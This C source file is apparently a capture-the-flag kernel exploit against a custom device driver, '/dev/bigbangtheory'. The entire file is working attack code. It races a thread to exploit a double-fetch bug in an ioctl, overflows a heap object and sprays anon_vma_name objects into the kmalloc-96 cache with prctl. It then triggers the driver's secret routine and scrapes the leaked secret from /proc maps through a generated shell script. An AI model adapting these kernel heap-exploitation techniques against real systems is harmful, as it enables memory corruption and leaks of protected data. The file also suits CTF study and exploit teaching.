#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define ROSES_ARE_RED_WIRES_ARE_TOO    0xc020ca00 // do_create
#define BOOMERS_BEWARE                 0xc020ca01 // do_read
#define SNIP_HAPPENS                   0xc020ca02 // do_delete
#define JAMES_BOMB                     0xc020ca03 // do_secret
#define THIS_IS_FINE                   0xc020ca04 // do_size
#define BOMB_VOYAGE                    0xc020ca05 // do_write

// Global variables
int fd = 0; 
pid_t current_pid = -1; 

struct req {
    uint64_t idx;
    uint64_t size;
    uint64_t addr;
    uint64_t signature; 
};

// Module functions
int do_create(uint64_t * size, char * addr) {
    struct req req; 
    req.idx = 0; 
    req.size = (uint64_t) size;
    req.addr = (uint64_t) addr; 
    req.signature = 0x0; 
    
    if (ioctl(fd, ROSES_ARE_RED_WIRES_ARE_TOO, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    //printf("[+] Performed create\n");
    return 0;
}

int do_read(uint64_t idx, char * addr, char * signature) {
    struct req req; 
    req.idx = idx; 
    req.size = 0x0;
    req.addr = (uint64_t) addr; 
    req.signature = (uint64_t) signature; 
    
    if (ioctl(fd, BOOMERS_BEWARE, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    //printf("[+] Performed read\n");
    return 0;
}

int do_delete(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.size = 0x0;
    req.addr = 0x0; 
    req.signature = 0x0; 
    
    if (ioctl(fd, SNIP_HAPPENS, &req) < 0) {
        perror("[!] Delete failed");
        return -1;
    }
    //printf("[+] Performed delete\n");
    return 0;
}

int do_secret(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.size = 0x0;
    req.addr = 0x0; 
    req.signature = 0x0; 
    
    if (ioctl(fd, JAMES_BOMB, &req) < 0) {
        perror("[!] Secret failed");
        return -1;
    }
    //printf("[+] Triggered secret\n");
    return 0;
}


int do_size(uint64_t idx, uint64_t * size, char * addr) {
    struct req req; 
    req.idx = idx; 
    req.size = (uint64_t) size;
    req.addr = (uint64_t) addr; 
    req.signature = 0x0; 
    
    if (ioctl(fd, THIS_IS_FINE, &req) < 0) {
        perror("[!] Change size failed");
        return -1;
    }
    printf("[+] Changed size\n");
    return 0;
}

int do_write(uint64_t idx, char * addr) {
    struct req req; 
    req.idx = idx; 
    req.size = 0x0;
    req.addr = (uint64_t) addr; 
    req.signature = 0x0; 
    
    if (ioctl(fd, BOMB_VOYAGE, &req) < 0) {
        perror("[!] Write failed");
        return -1;
    }
    printf("[+] Performed write\n");
    return 0;
}

// Tech object spray
#define NUM_OBJECTS 0x80

// anon_vma_name spray
#define NUM_PRCTLS 1024
void * address[NUM_PRCTLS];

int rename_vma(unsigned long addr, unsigned long size, char *name) {
    int res;
    res = prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, addr, size, name);
    if (res < 0)
        perror("[!] prctl");
	    return -errno;
    return res;
}

static void spray_vma_name(void) {
    for (int idx = 0; idx < NUM_PRCTLS; idx++) {
        address[idx] = mmap(NULL, 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        
        char buf[0x20];
        memset(buf, 0x0, sizeof(buf)); 
        char test_str[] = "AAAAAAAAAAAAAAAA\x00";
        memcpy(buf, test_str, 16);
        char store[8];
        memset(store, 0, 8);
        sprintf(store, "%d", idx);
        memcpy(&buf[16], store, 8);
        
        rename_vma((unsigned long) address[idx], 1024, buf);
    }
}

// EXPLOIT STUFF

// Exploit flipping variable and thread
volatile uint64_t target_size; 
//uint64_t target_active = 0x0;
void * target_thread(void *arg) {
    volatile uint64_t * number = (volatile uint64_t *)&target_size; 
    while (1 == 1) {
        target_size = 0x39; // double fetch exploit size to overwrite one byte
        usleep(1);
        target_size = 0x28; 
        usleep(1);
    }
}

// Extract secret from anon_vma_name objects
int extract_secret() {    
    char command[0x100];
    
    sprintf(command, "echo \'#!/bin/bash\nLC_CTYPE=C grep --color=never \"[^[:print:]]\" /proc/%d/maps | cut -d \":\" -f 3 > /tmp/secret.txt\' > /tmp/a.sh", current_pid); 
    //printf("%s\n", command);
    system(command);
    system("chmod +x /tmp/a.sh");
    system("/bin/sh /tmp/a.sh"); 
        
    // Extract secret
    FILE * fp;
    char secret_msg[0x30];
    
    fp = fopen("/tmp/secret.txt", "rb");
    if (fp == NULL) {
        perror("[!] fopen");
        exit(-1);
    }
    memset(secret_msg, 0, sizeof(secret_msg));
    fread(secret_msg, 28, 1, fp);
    printf("[+] Extracted secret: %s\n", secret_msg); 
    fclose(fp); 
    
    return 0;
}

int main(void) {

    int ret = 0x0; 

    // Initialize buffers
    char buf[0x200]; 
    char buf2[0x200]; 
    printf("[+] Initial setup\n");
    memset(buf, 0x44, sizeof(buf)); 
    memset(buf2, 0x0, sizeof(buf2)); 
    
    // CPU setaffinity
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }

    // Open device
    printf("[+] Opening device\n");
    if ((fd = open("/dev/bigbangtheory", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // Spray 0x80 objects 
    printf("[+] Create 0x80 objects\n"); 
    uint64_t initial_size = 0x28; 
    for (int i = 0; i < NUM_OBJECTS; i++) {
        do_create(&initial_size, buf); 
    }
    
    // Open a new thread to flip the size global variable to exploit double fetch
    pthread_t thr;
    int a = pthread_create(&thr, NULL, target_thread, NULL); 
    if(a != 0) {
        perror("pthread_create");
        exit(-1);
    }
    
    memset(buf, 0x0, sizeof(buf)); 
    
    // Exploit double fetch
    do_size(0x50, (volatile uint64_t *)&initial_size, buf);
    while (*(uint64_t *)buf == 0x28) {
        do_size(0x50, (volatile uint64_t *)&target_size, buf);
        printf("Target size: 0x%llx\n", target_size); 
        printf("Buf: 0x%llx\n", *(uint64_t *)buf); 
    } 
    
    // Cause a buffer overflow -- write 0x4646464646464646 to signature, and one null byte to secret
    memset(buf, 0x0, sizeof(buf)); 
    memset(buf, 0x46, 0x38); 
    do_write(0x50, buf); 
    
    // Find the corrupted object
    int corrupted_idx = -1; 
    printf("[+] Finding corrupted object\n"); 
    for (int i = 0; i < NUM_OBJECTS; i++) {
        memset(buf, 0x0, sizeof(buf)); 
        memset(buf2, 0x0, sizeof(buf2)); 
        do_read(i, buf, buf2); 
        if (*(uint64_t *)buf2 == 0x4646464646464646) {
            corrupted_idx = i; 
            printf("[+] Found corrupted object\n"); 
            printf("    Signature of object 0x%x: %s\n", i, buf2); 
            break;
        }
    }
    if (corrupted_idx == -1) {
        printf("[!] Unable to find corrupted object\n"); 
        return -1; 
    }
    
    // Free all object except for the corrupted object
    printf("[+] Freeing all objects except for the corrupted object\n"); 
    for (int i = 0; i < NUM_OBJECTS; i++) {
        if (i == corrupted_idx) {
            continue; 
        } else {
            do_delete(i); 
        }
    }
    
    // Spray anon_vma_name over freed object in kmalloc-96 cache
    current_pid = getpid(); 
    printf("[+] Current pid: %d\n", current_pid); 
    spray_vma_name(); 
    
    // Read secret
    #define SECRET_MAX 10
    for (int i = 0; i < SECRET_MAX + 1; i++) {
        do_secret(corrupted_idx); 
        extract_secret(); 
        sleep(1); 
    }

    // No kaslr addresses for debugging
    // tech_array 0xffffffffc0002030
    // secret_idx 0xffffffffc0004034
    // secret_array 0xffffffffc0004190
    // tech_count 0xffffffffc0004030
    
    // Address of corrupted object 0xffffffffc00022b0
    
    return 0; 
}
